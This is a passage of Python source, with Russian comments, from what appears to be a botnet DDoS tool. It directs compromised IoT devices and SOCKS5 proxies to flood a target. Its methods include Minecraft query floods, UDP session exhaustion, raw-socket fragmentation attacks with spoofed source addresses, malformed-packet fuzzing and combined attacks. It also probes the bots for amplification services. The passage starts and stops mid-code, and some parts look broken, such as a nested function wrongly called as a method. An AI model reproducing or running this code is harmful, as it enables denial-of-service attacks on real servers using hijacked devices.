                attack_stats['protocol_packets'] = result if result else 0
            except Exception as e:
                print(f"❌ Ошибка Minecraft Protocol: {e}")

        def run_query_attack():
            try:
                # Server list ping атака
                result = self.minecraft_query_flood(target_ip, target_port, duration)
                attack_stats['query_packets'] = result if result else 0
            except Exception as e:
                print(f"❌ Ошибка Minecraft Query: {e}")

        protocol_thread = threading.Thread(target=run_protocol_attack)
        query_thread = threading.Thread(target=run_query_attack)
        
        protocol_thread.daemon = True
        query_thread.daemon = True
        
        protocol_thread.start()
        query_thread.start()
        
        protocol_thread.join(timeout=duration + 10)
        query_thread.join(timeout=duration + 10)
        
        attack_stats['total_impact'] = attack_stats['protocol_packets'] + attack_stats['query_packets']
        
        print(f"\n🎯 РЕЗУЛЬТАТЫ КОМБИНИРОВАННОЙ MINECRAFT АТАКИ:")
        print(f"⛏️ Protocol пакетов: {attack_stats['protocol_packets']}")
        print(f"📡 Query пакетов: {attack_stats['query_packets']}")
        print(f"💥 Общий impact: {attack_stats['total_impact']}")
        
        return attack_stats['total_impact']

    def minecraft_query_flood(self, target_ip, target_port=25565, duration=60):
        """Minecraft Server List Ping flood атака"""
        print(f"📡 Запуск Minecraft Query Flood на {target_ip}:{target_port}")
        
        # Эта атака использует UDP для server list ping
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return 0

        attack_stats = {
            'total_queries': 0,
            'total_bytes': 0,
            'failed_queries': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def _create_minecraft_query_packet(self):
            """Создает Minecraft server list ping packet"""
            # Magic bytes + payload
            magic = b'\xFE\xFD'
            type_byte = b'\x09'  # Handshake
            session_id = struct.pack('>I', random.randint(1, 1000000))
            token = b'\x00\x00\x00\x00'
            
            return magic + type_byte + session_id + token

        def minecraft_query_attack(device):
            queries_sent = 0
            bytes_sent = 0
            failed_queries = 0
            
            try:
                print(f"📡 {device.ip} начинает Minecraft Query атаку...")
                start_time = time.time()
                
                # UDP сокет для query
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Создаем query пакет
                        query_packet = self._create_minecraft_query_packet()
                        
                        # Отправляем пакет
                        sock.sendto(query_packet, (target_ip, target_port))
                        
                        queries_sent += 1
                        bytes_sent += len(query_packet)
                        
                        attack_stats['total_queries'] += 1
                        attack_stats['total_bytes'] += len(query_packet)
                        
                        # Периодически проверяем ответы
                        if random.random() < 0.05:
                            try:
                                response = sock.recv(1024)
                                # Сервер отвечает - хорошо, продолжаем
                            except socket.timeout:
                                pass
                        
                        time.sleep(random.uniform(0.01, 0.05))
                        
                    except Exception as e:
                        failed_queries += 1
                        attack_stats['failed_queries'] += 1
                        continue
                
                sock.close()
                
                print(f"✅ {device.ip} отправил {queries_sent} query запросов")
                
                return queries_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        return self._run_attack(iot_bots, attack_stats, minecraft_query_attack, "Minecraft Query")

    def udp_flood_via_socks5(self, device, target_ip, target_port):
        """UDP флуд через SOCKS5 прокси"""
        try:
            # SOCKS5 поддерживает UDP через специальный метод
            sock = socks.socksocket()
            if device.username and device.password:
                sock.set_proxy(socks.SOCKS5, device.ip, device.port, 
                              username=device.username, password=device.password)
            else:
                sock.set_proxy(socks.SOCKS5, device.ip, device.port)
            sock.settimeout(2)
            
            # Для UDP через SOCKS5 нужно сначала установить TCP соединение
            # затем использовать UDP ASSOCIATE команду
            sock.connect((target_ip, target_port))
            
            data_size = random.randint(100, 1024)
            data = os.urandom(data_size)
            sock.send(data)
            
            sock.close()
            return data_size, True
            
        except Exception as e:
            return 0, False

    def udp_session_exhaustion(self, target_ip, target_port, duration=60):
        """
        UDP Session Exhaustion Attack - истощение сессий UDP сервисов
        Создает множество псевдо-сессий для истощения ресурсов сервера
        """
        print(f"🔄 Запуск UDP Session Exhaustion атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_sessions': 0,
            'total_packets': 0,
            'total_bytes': 0,
            'failed_sessions': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def udp_session_attack(device):
            sessions_created = 0
            packets_sent = 0
            bytes_sent = 0
            failed_sessions = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"🔄 {bot_type} {device.ip} начинает UDP Session Exhaustion атаку...")
                start_time = time.time()
                
                # Создаем UDP сокет
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                
                # Список для отслеживания активных сессий
                active_sessions = []
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # 1. Создание новой сессии
                        session_id = random.randint(100000, 999999)
                        session_data = {
                            'id': session_id,
                            'sequence': 0,
                            'last_activity': time.time(),
                            'state': 'active'
                        }
                        
                        # Отправка пакета инициализации сессии
                        init_packet = self._create_udp_session_init(session_id, target_ip, target_port)
                        sock.sendto(init_packet, (target_ip, target_port))
                        
                        packets_sent += 1
                        bytes_sent += len(init_packet)
                        sessions_created += 1
                        active_sessions.append(session_data)
                        
                        attack_stats['total_sessions'] += 1
                        attack_stats['total_packets'] += 1
                        attack_stats['total_bytes'] += len(init_packet)
                        
                        # 2. Поддержание активных сессий
                        for session in active_sessions[:]:  # Копируем список для безопасной итерации
                            if time.time() - session['last_activity'] > 2:  # Обновляем каждые 2 секунды
                                keepalive_packet = self._create_udp_session_keepalive(
                                    session['id'], session['sequence'], target_ip, target_port
                                )
                                sock.sendto(keepalive_packet, (target_ip, target_port))
                                
                                packets_sent += 1
                                bytes_sent += len(keepalive_packet)
                                session['sequence'] += 1
                                session['last_activity'] = time.time()
                                
                                attack_stats['total_packets'] += 1
                                attack_stats['total_bytes'] += len(keepalive_packet)
                        
                        # 3. Периодическое создание ложных ответов
                        if random.random() < 0.3 and active_sessions:
                            fake_session = random.choice(active_sessions)
                            fake_response = self._create_udp_fake_response(
                                fake_session['id'], fake_session['sequence'], target_ip, target_port
                            )
                            sock.sendto(fake_response, (target_ip, target_port))
                            
                            packets_sent += 1
                            bytes_sent += len(fake_response)
                            attack_stats['total_packets'] += 1
                            attack_stats['total_bytes'] += len(fake_response)
                        
                        # 4. Очистка старых сессий (имитация нормального поведения)
                        if len(active_sessions) > 50:
                            # Закрываем случайные сессии
                            sessions_to_close = random.sample(active_sessions, min(10, len(active_sessions)))
                            for session in sessions_to_close:
                                close_packet = self._create_udp_session_close(
                                    session['id'], session['sequence'], target_ip, target_port
                                )
                                sock.sendto(close_packet, (target_ip, target_port))
                                
                                packets_sent += 1
                                bytes_sent += len(close_packet)
                                active_sessions.remove(session)
                                
                                attack_stats['total_packets'] += 1
                                attack_stats['total_bytes'] += len(close_packet)
                        
                        time.sleep(0.1)  # Контролируемая скорость
                        
                    except Exception as e:
                        failed_sessions += 1
                        attack_stats['failed_sessions'] += 1
                        continue
                
                # Завершаем все активные сессии
                for session in active_sessions:
                    try:
                        close_packet = self._create_udp_session_close(
                            session['id'], session['sequence'], target_ip, target_port
                        )
                        sock.sendto(close_packet, (target_ip, target_port))
                    except:
                        pass
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"✅ {bot_type} {device.ip} создал {sessions_created} сессий, "
                      f"отправил {packets_sent} пакетов ({mb_sent:.2f} МБ)")
                
                return sessions_created, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        return self._run_attack(all_active_bots, attack_stats, udp_session_attack, "UDP Session Exhaustion")

    def _create_udp_session_init(self, session_id, target_ip, target_port):
        """Создает пакет инициализации UDP сессии"""
        # Заголовок сессии
        session_header = struct.pack('!I', session_id)  # 4 байта - ID сессии
        session_header += struct.pack('!H', 0)  # 2 байта - флаги (INIT)
        session_header += struct.pack('!I', int(time.time()))  # 4 байта - timestamp
        
        # Данные инициализации
        init_data = {
            'version': 1,
            'capabilities': random.randint(0, 65535),
            'window_size': random.randint(1024, 65535),
            'max_segment_size': random.randint(536, 1460)
        }
        
        data = struct.pack('!BHHH', 
                          init_data['version'],
                          init_data['capabilities'],
                          init_data['window_size'],
                          init_data['max_segment_size'])
        
        # Случайные опции
        options = os.urandom(random.randint(10, 50))
        
        return session_header + data + options

    def _create_udp_session_keepalive(self, session_id, sequence, target_ip, target_port):
        """Создает keepalive пакет для поддержания сессии"""
        session_header = struct.pack('!I', session_id)  # ID сессии
        session_header += struct.pack('!H', 1)  # флаги (KEEPALIVE)
        session_header += struct.pack('!I', sequence)  # номер последовательности
        session_header += struct.pack('!I', int(time.time()))  # timestamp
        
        # Keepalive данные
        keepalive_data = struct.pack('!B', 1)  # тип keepalive
        keepalive_data += os.urandom(random.randint(5, 20))  # случайные данные
        
        return session_header + keepalive_data

    def _create_udp_fake_response(self, session_id, sequence, target_ip, target_port):
        """Создает ложный ответ для имитации активности"""
        session_header = struct.pack('!I', session_id)  # ID сессии
        session_header += struct.pack('!H', 2)  # флаги (RESPONSE)
        session_header += struct.pack('!I', sequence)  # номер последовательности
        session_header += struct.pack('!I', int(time.time()))  # timestamp
        
        # Имитация ответных данных
        response_types = [b'OK', b'ACK', b'DATA', b'ERROR', b'TIMEOUT']
        response_data = random.choice(response_types)
        response_data += struct.pack('!I', random.randint(0, 1000))  # дополнительная информация
        
        return session_header + response_data

    def _create_udp_session_close(self, session_id, sequence, target_ip, target_port):
        """Создает пакет закрытия сессии"""
        session_header = struct.pack('!I', session_id)  # ID сессии
        session_header += struct.pack('!H', 3)  # флаги (CLOSE)
        session_header += struct.pack('!I', sequence)  # номер последовательности
        session_header += struct.pack('!I', int(time.time()))  # timestamp
        
        # Причина закрытия
        close_reasons = [b'normal', b'timeout', b'error', b'user']
        close_data = random.choice(close_reasons)
        
        return session_header + close_data


    def advanced_fragmentation_attack(self, target_ip, target_port=0, duration=60):
        """Продвинутая фрагментационная атака с различными техниками"""
        print(f"🎯 Запуск продвинутой фрагментационной атаки на {target_ip}")
        
        # Автоматически используем все доступные IoT боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов")
        
        if not iot_bots:
            print("❌ Нет доступных IoT устройств!")
            return 0
        
        if not self.raw_socket_available:
            print("❌ Raw socket недоступен!")
            return 0
        
        attack_stats = {
            'total_packets': 0,
            'total_fragments': 0,
            'total_bytes': 0,
            'failed_packets': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def create_advanced_fragments(source_ip, dest_ip, technique):
            """Создает фрагменты с использованием различных техник"""
            fragments = []
            ip_id = random.randint(1, 65535)
            source_port = random.randint(1024, 65535)
            dest_port = random.randint(1, 65535) if target_port == 0 else target_port
            
            # Базовые данные
            data = b'F' * 3000
            
            udp_header = struct.pack('!HHHH', source_port, dest_port, 8 + len(data), 0)
            full_packet = udp_header + data
            
            if technique == "tiny_fragments":
                # Очень маленькие фрагменты (1-8 байт)
                fragment_size = random.randint(1, 8)
                offset = 0
                while offset < len(full_packet):
                    frag_data = full_packet[offset:offset + fragment_size]
                    more_fragments = 1 if (offset + fragment_size) < len(full_packet) else 0
                    
                    ip_header = self._create_ip_header_with_fragmentation(
                        source_ip=source_ip,
                        dest_ip=dest_ip,
                        data_length=len(frag_data),
                        protocol=socket.IPPROTO_UDP,
                        identification=ip_id,
                        fragment_offset=offset // 8,
                        more_fragments=more_fragments
                    )
                    fragments.append(ip_header + frag_data)
                    offset += fragment_size
            
            elif technique == "overlapping":
                # Перекрывающиеся фрагменты
                fragments1 = full_packet[:100]
                fragments2 = full_packet[50:150]  # Перекрытие 50 байт
                fragments3 = full_packet[100:200]
                
                for i, (frag_data, frag_offset) in enumerate([(fragments1, 0), (fragments2, 50//8), (fragments3, 100//8)]):
                    ip_header = self._create_ip_header_with_fragmentation(
                        source_ip=source_ip,
                        dest_ip=dest_ip,
                        data_length=len(frag_data),
                        protocol=socket.IPPROTO_UDP,
                        identification=ip_id,
                        fragment_offset=frag_offset,
                        more_fragments=1 if i < 2 else 0
                    )
                    fragments.append(ip_header + frag_data)
            
            elif technique == "out_of_order":
                # Фрагменты в неправильном порядке
                fragment_size = 200
                offset = 0
                temp_fragments = []
                
                while offset < len(full_packet):
                    frag_data = full_packet[offset:offset + fragment_size]
                    more_fragments = 1 if (offset + fragment_size) < len(full_packet) else 0
                    
                    ip_header = self._create_ip_header_with_fragmentation(
                        source_ip=source_ip,
                        dest_ip=dest_ip,
                        data_length=len(frag_data),
                        protocol=socket.IPPROTO_UDP,
                        identification=ip_id,
                        fragment_offset=offset // 8,
                        more_fragments=more_fragments
                    )
                    temp_fragments.append(ip_header + frag_data)
                    offset += fragment_size
                
                # Перемешиваем фрагменты
                fragments = temp_fragments
                random.shuffle(fragments)
            
            return fragments
        
        def advanced_fragmentation_single(device):
            packets_sent = 0
            fragments_sent = 0
            bytes_sent = 0
            failed_packets = 0
            
            try:
                print(f"🎯 {device.ip} начинает продвинутую фрагментационную атаку...")
                start_time = time.time()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                techniques = ["tiny_fragments", "overlapping", "out_of_order"]
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
                        technique = random.choice(techniques)
                        
                        fragments = create_advanced_fragments(source_ip, target_ip, technique)
                        
                        for fragment in fragments:
                            sock.sendto(fragment, (target_ip, 0))
                            fragments_sent += 1
                            bytes_sent += len(fragment)
                            attack_stats['total_fragments'] += 1
                            attack_stats['total_bytes'] += len(fragment)
                        
                        packets_sent += 1
                        attack_stats['total_packets'] += 1
                        
                        time.sleep(0.02)
                        
                    except Exception as e:
                        failed_packets += 1
                        attack_stats['failed_packets'] += 1
                        continue
                
                sock.close()
                
                print(f"✅ {device.ip} отправил {packets_sent} пакетов "
                      f"({fragments_sent} фрагментов), ошибок: {failed_packets}")
                return packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(iot_bots, attack_stats, advanced_fragmentation_single,
                                  "Advanced Fragmentation", max_workers=min(len(iot_bots), 5000000000))
        
        print(f"\n🎯 РЕЗУЛЬТАТЫ ПРОДВИНУТОЙ ФРАГМЕНТАЦИОННОЙ АТАКИ:")
        print(f"📦 Всего пакетов: {attack_stats['total_packets']}")
        print(f"🔧 Всего фрагментов: {attack_stats['total_fragments']}")
        print(f"💾 Данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} MB")
        print(f"❌ Ошибок: {attack_stats['failed_packets']}")
        
        return results

    def udp_protocol_fuzzing(self, target_ip, target_port, duration=60):
        """
        UDP Protocol Fuzzing Attack - фаззинг UDP протоколов
        Отправка некорректных/неожиданных пакетов для поиска уязвимостей
        """
        print(f"🧪 Запуск UDP Protocol Fuzzing атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_fuzz_packets': 0,
            'total_bytes': 0,
            'crash_attempts': 0,
            'protocol_errors': 0,
            'start_time': time.time(),
            'is_running': True
        }

        def udp_fuzzing_attack(device):
            fuzz_packets_sent = 0
            bytes_sent = 0
            crash_attempts = 0
            protocol_errors = 0
            
            try:
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"🧪 {bot_type} {device.ip} начинает UDP Protocol Fuzzing атаку...")
                start_time = time.time()
                
                # Создаем UDP сокет
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                
                fuzz_techniques = [
                    'buffer_overflow',
                    'format_strings',
                    'integer_overflow',
                    'protocol_violation',
                    'random_corruption',
                    'edge_cases'
                ]
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        technique = random.choice(fuzz_techniques)
                        fuzz_packet = self._create_fuzz_packet(technique, target_ip, target_port)
                        
                        # Отправка фаззинг пакета
                        sock.sendto(fuzz_packet, (target_ip, target_port))
                        
                        fuzz_packets_sent += 1
                        bytes_sent += len(fuzz_packet)
                        
                        attack_stats['total_fuzz_packets'] += 1
                        attack_stats['total_bytes'] += len(fuzz_packet)
                        
                        # Счетчики для специфичных техник
                        if technique in ['buffer_overflow', 'integer_overflow']:
                            crash_attempts += 1
                            attack_stats['crash_attempts'] += 1
                        
                        if technique in ['protocol_violation', 'edge_cases']:
                            protocol_errors += 1
                            attack_stats['protocol_errors'] += 1
                        
                        # Периодическая проверка ответов
                        if random.random() < 0.1:
                            try:
                                response = sock.recv(1024)
                                # Анализ ответа может выявить уязвимости
                                if self._analyze_fuzz_response(response):
                                    print(f"🎯 {device.ip}: Обнаружена аномалия в ответе!")
                            except socket.timeout:
                                pass  # Таймаут - нормально для фаззинга
                        
                        time.sleep(random.uniform(0.05, 0.2))
                        
                    except Exception as e:
                        # Ошибки при фаззинге - это нормально
                        continue
                
                sock.close()
                
                mb_sent = bytes_sent / 1024 / 1024
                bot_type = "SOCKS5" if device.bot_type == "socks5" else "IoT"
                print(f"✅ {bot_type} {device.ip} отправил {fuzz_packets_sent} фаззинг пакетов "
                      f"({mb_sent:.2f} МБ), попыток краша: {crash_attempts}")
                
                return fuzz_packets_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0

        return self._run_attack(all_active_bots, attack_stats, udp_fuzzing_attack, "UDP Protocol Fuzzing")

    def _create_fuzz_packet(self, technique, target_ip, target_port):
        """Создает фаззинг пакет в зависимости от техники"""
        if technique == 'buffer_overflow':
            return self._create_buffer_overflow_fuzz()
        elif technique == 'format_strings':
            return self._create_format_string_fuzz()
        elif technique == 'integer_overflow':
            return self._create_integer_overflow_fuzz()
        elif technique == 'protocol_violation':
            return self._create_protocol_violation_fuzz()
        elif technique == 'random_corruption':
            return self._create_random_corruption_fuzz()
        elif technique == 'edge_cases':
            return self._create_edge_case_fuzz()
        else:
            return self._create_generic_fuzz()

    def _create_buffer_overflow_fuzz(self):
        """Создает пакет для тестирования переполнения буфера"""
        # Длинные строки и большие значения
        fuzz_types = [
            b'A' * random.randint(1000, 10000),  # Длинная строка
            b'\x00' * random.randint(500, 5000),  # Много нулей
            b'\xFF' * random.randint(1000, 8000),  # Много 0xFF
            os.urandom(random.randint(2000, 10000))  # Случайные данные
        ]
        
        # Добавляем специфичные паттерны для переполнения
        patterns = [
            b'%s' * 100,  # Format string
            b'../' * 100,  # Path traversal
            b'\\x41' * 500,  # Hex escape
        ]
        
        return random.choice(fuzz_types) + random.choice(patterns)

    def _create_format_string_fuzz(self):
        """Создает пакет для тестирования уязвимостей format string"""
        format_strings = [
            b'%s' * random.randint(10, 100),
            b'%x' * random.randint(20, 200),
            b'%n' * random.randint(5, 50),
            b'%08x' * random.randint(10, 100),
            b'%s%s%s%s%s',
            b'%p%p%p%p%p',
        ]
        
        # Комбинируем с обычными данными
        base_data = os.urandom(random.randint(10, 100))
        return base_data + random.choice(format_strings) + base_data

    def _create_integer_overflow_fuzz(self):
        """Создает пакет для тестирования целочисленного переполнения"""
        # Крайние значения integers
        integer_values = [
            struct.pack('!I', 0),  # Ноль
            struct.pack('!I', 0xFFFFFFFF),  # Максимальное unsigned int
            struct.pack('!I', 0x7FFFFFFF),  # Максимальное signed int
            struct.pack('!I', 0x80000000),  # Минимальное signed int
            struct.pack('!I', 0xDEADBEEF),  # Магическое значение
            struct.pack('!I', 0x41414141),  # AAAA
        ]
        
        # Комбинации крайних значений
        packet = b''
        for _ in range(random.randint(3, 10)):
            packet += random.choice(integer_values)
        
        return packet

    def _create_protocol_violation_fuzz(self):
        """Создает пакет нарушающий спецификацию протокола"""
        violations = [
            b'\x00' * 8,  # Все нули
            b'\xFF' * 8,  # Все единицы
            b'\x00\xFF' * 10,  # Чередование
            struct.pack('!B', 0xFF) + os.urandom(7),  # Неверная версия
            b'INVALID' + os.urandom(10),  # Неверная команда
            struct.pack('!H', 0xFFFF) + os.urandom(20),  # Максимальные значения
        ]
        
        return random.choice(violations)

    def _create_random_corruption_fuzz(self):
        """Создает случайно поврежденные пакеты"""
        # Сначала создаем валидный-looking пакет
        base_packet = self._create_udp_session_init(
            random.randint(1, 1000), 
            "127.0.0.1", 
            random.randint(1, 65535)
        )
        
        # Случайно повреждаем байты
        corruption_count = random.randint(1, len(base_packet) // 4)
        packet_bytes = bytearray(base_packet)
        
        for _ in range(corruption_count):
            pos = random.randint(0, len(packet_bytes) - 1)
            packet_bytes[pos] = random.randint(0, 255)
        
        return bytes(packet_bytes)

    def _create_edge_case_fuzz(self):
        """Создает пакеты для тестирования граничных случаев"""
        edge_cases = [
            b'',  # Пустой пакет
            b'\x00',  # Один нуль
            b'\xFF',  # Одна 0xFF
            b'A',  # Один символ
            struct.pack('!I', 1),  # Минимальное значение
            struct.pack('!Q', 0xFFFFFFFFFFFFFFFF),  # Максимальное 64-bit
            b'NULL\x00TERM',  # С нулевым терминатором
            b'LONG' * 1000,  # Очень длинная строка
        ]
        
        return random.choice(edge_cases)

    def _create_generic_fuzz(self):
        """Создает общий фаззинг пакет"""
        strategies = [
            lambda: os.urandom(random.randint(1, 1024)),
            lambda: b'A' * random.randint(1, 2048),
            lambda: b'\x00' * random.randint(1, 512),
            lambda: b'\xFF' * random.randint(1, 1024),
            lambda: ''.join([chr(random.randint(0, 255)) for _ in range(random.randint(1, 512))]).encode('latin-1'),
        ]
        
        return random.choice(strategies)()

    def _analyze_fuzz_response(self, response):
        """Анализирует ответ на наличие аномалий"""
        if not response:
            return False
        
        # Признаки возможных уязвимостей
        indicators = [
            b'segmentation fault',
            b'buffer overflow',
            b'stack smashing',
            b'format string',
            b'memory corruption',
            b'null pointer',
            b'access violation',
            b'assertion failed',
        ]
        
        response_lower = response.lower()
        for indicator in indicators:
            if indicator in response_lower:
                return True
        
        # Проверяем необычные коды ошибок
        if len(response) < 10:
            error_indicators = [b'error', b'fail', b'crash', b'exception']
            for indicator in error_indicators:
                if indicator in response_lower:
                    return True
        
        return False

    def smart_udp_combo_attack(self, target_ip, target_port, duration=60):
        """
        Комбинированная UDP атака, объединяющая Session Exhaustion и Protocol Fuzzing
        """
        print(f"💥 Запуск комбинированной SMART UDP атаки на {target_ip}:{target_port}")
        
        attack_stats = {
            'session_attacks': 0,
            'fuzzing_attacks': 0,
            'total_impact': 0,
            'start_time': time.time()
        }
        
        # Запускаем обе атаки параллельно
        import threading
        
        def run_session_attack():
            try:
                result = self.udp_session_exhaustion(target_ip, target_port, duration)
                attack_stats['session_attacks'] = result
            except Exception as e:
                print(f"❌ Ошибка Session Exhaustion: {e}")
        
        def run_fuzzing_attack():
            try:
                result = self.udp_protocol_fuzzing(target_ip, target_port, duration)
                attack_stats['fuzzing_attacks'] = result
            except Exception as e:
                print(f"❌ Ошибка Protocol Fuzzing: {e}")
        
        # Запускаем в отдельных потоках
        session_thread = threading.Thread(target=run_session_attack)
        fuzzing_thread = threading.Thread(target=run_fuzzing_attack)
        
        session_thread.daemon = True
        fuzzing_thread.daemon = True
        
        session_thread.start()
        fuzzing_thread.start()
        
        # Ждем завершения
        session_thread.join(timeout=duration + 10)
        fuzzing_thread.join(timeout=duration + 10)
        
        # Считаем общий impact
        attack_stats['total_impact'] = attack_stats['session_attacks'] + attack_stats['fuzzing_attacks']
        
        print(f"\n🎯 РЕЗУЛЬТАТЫ КОМБИНИРОВАННОЙ UDP АТАКИ:")
        print(f"🔄 Session Exhaustion: {attack_stats['session_attacks']} сессий")
        print(f"🧪 Protocol Fuzzing: {attack_stats['fuzzing_attacks']} пакетов")
        print(f"💥 Общий impact: {attack_stats['total_impact']}")
        
        return attack_stats['total_impact']


    def udp_flood_attack(self, target_ip, target_port, duration=0, packets_per_second=5000):
        """МАКСИМАЛЬНО МОЩНЫЙ UDP flood с интеллектуальным использованием IoT"""
        
        print(f"🌀 ЗАПУСК МОЩНОГО UDP FLOOD НА {target_ip}:{target_port}")
        
        # Боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT + {len(socks5_bots)} SOCKS5")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        attack_stats = {
            'total_packets': 0, 'total_bytes': 0, 'failed_packets': 0,
            'start_time': time.time(), 'is_running': True, 'lock': threading.Lock()
        }

        def high_speed_udp_attack(device):
            """Интеллектуальная UDP атака с определением возможностей устройства"""
            
            if device.bot_type == "socks5":
                return self._socks5_udp_attack(device, target_ip, target_port, duration, attack_stats)
            else:
                return self.optimized_iot_udp_attack(device, target_ip, target_port, duration, attack_stats)

        # Запуск
        all_bots = iot_bots + socks5_bots
        results = self._run_attack(all_bots, attack_stats, high_speed_udp_attack, "UDP", 
                                  max_workers=min(len(all_bots) * 3, self.max_threads))
        
        # Статистика
        total_time = time.time() - attack_stats['start_time']
        total_mb = attack_stats['total_bytes'] / 1024 / 1024
        total_pps = attack_stats['total_packets'] / total_time if total_time > 0 else 0
        
        print(f"\n🎯 ИТОГИ UDP FLOOD:")
        print(f"   📦 Пакетов: {attack_stats['total_packets']:,}")
        print(f"   💾 Данных: {total_mb:.2f} МБ")
        print(f"   ⚡ Скорость: {total_pps:.0f} пакетов/сек")
        print(f"   🚫 Ошибок: {attack_stats['failed_packets']}")
        
        return results

    def optimized_iot_udp_attack(self, device, target_ip, target_port, duration, attack_stats):
        """Оптимизированная атака для IoT устройств с учетом их специфики"""
        
        packets_sent = 0
        bytes_sent = 0
        failed_packets = 0
        
        try:
            print(f"🔍 Анализируем возможности IoT {device.ip}...")
            
            # ОПРЕДЕЛЯЕМ ТИП IoT УСТРОЙСТВА И ЕГО ВОЗМОЖНОСТИ
            device_capabilities = self._detect_iot_capabilities(device.ip)
            
            print(f"📊 IoT {device.ip} возможности: {device_capabilities}")
            
            # РАЗНЫЕ СТРАТЕГИИ ДЛЯ РАЗНЫХ ТИПОВ IoT
            if device_capabilities['has_raw_socket']:
                print(f"🚀 Мощное IoT {device.ip} - использую RAW сокеты")
                return self._raw_udp_attack(device, target_ip, target_port, duration, attack_stats)
                
            elif device_capabilities['has_amplification']:
                print(f"🎯 IoT {device.ip} с amplification - использую усиление")
                return self._iot_amplification_attack(device, target_ip, target_port, duration, attack_stats)
                
            elif device_capabilities['protocol_specific']:
                print(f"🔧 Специфичное IoT {device.ip} - использую протокольную атаку")
                return self._protocol_specific_attack(device, target_ip, target_port, duration, attack_stats)
                
            else:
                print(f"⚡ Стандартное IoT {device.ip} - оптимизированный UDP")
                return self._optimized_basic_udp(device, target_ip, target_port, duration, attack_stats)
                
        except Exception as e:
            print(f"❌ Критическая ошибка с IoT {device.ip}: {e}")
            return 0, 0

    def _detect_iot_capabilities(self, device_ip):
        """Определяет возможности IoT устройства"""
        
        capabilities = {
            'has_raw_socket': False,
            'has_amplification': False,
            'protocol_specific': False,
            'max_bandwidth': 1,  # Мбит/с по умолчанию
            'device_type': 'unknown'
        }
        
        try:
            # ПРОВЕРКА RAW SOCKET (требует тестового подключения)
            try:
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                test_sock.close()
                capabilities['has_raw_socket'] = True
            except:
                capabilities['has_raw_socket'] = False
            
            # ПРОВЕРКА AMPLIFICATION СЕРВИСОВ
            amplification_ports = [53, 123, 161, 1900, 5683]  # DNS, NTP, SNMP, SSDP, CoAP
            for port in amplification_ports:
                if self._check_port_open(device_ip, port):
                    capabilities['has_amplification'] = True
                    break
            
            # ОПРЕДЕЛЕНИЕ ТИПА УСТРОЙСТВА ПО ПОРТАМ
            open_ports = self._scan_common_ports(device_ip)
            
            # Проверка специфичных протоколов
            if 5683 in open_ports:  # CoAP
                capabilities['protocol_specific'] = True
                capabilities['device_type'] = 'coap_device'
            elif 1883 in open_ports:  # MQTT
                capabilities['protocol_specific'] = True
                capabilities['device_type'] = 'mqtt_device'
            elif 80 in open_ports or 443 in open_ports:  # Web
                capabilities['device_type'] = 'web_device'
            elif 23 in open_ports:  # Telnet
                capabilities['device_type'] = 'telnet_device'
            
            # ОЦЕНКА ПРОПУСКНОЙ СПОСОБНОСТИ (упрощенная)
            capabilities['max_bandwidth'] = self._estimate_bandwidth(device_ip)
            
        except Exception as e:
            print(f"⚠️ Ошибка детекции {device_ip}: {e}")
        
        return capabilities

    def _optimized_basic_udp(self, device, target_ip, target_port, duration, attack_stats):
        """Оптимизированная UDP атака для стандартных IoT"""
        
        packets_sent = 0
        bytes_sent = 0
        failed_packets = 0
        
        try:
            print(f"⚡ Стандартный IoT {device.ip} - запуск оптимизированной атаки...")
            
            # СОЗДАЕМ НЕСКОЛЬКО UDP СОКЕТОВ ДЛЯ ПАРАЛЛЕЛЬНОСТИ
            sockets = []
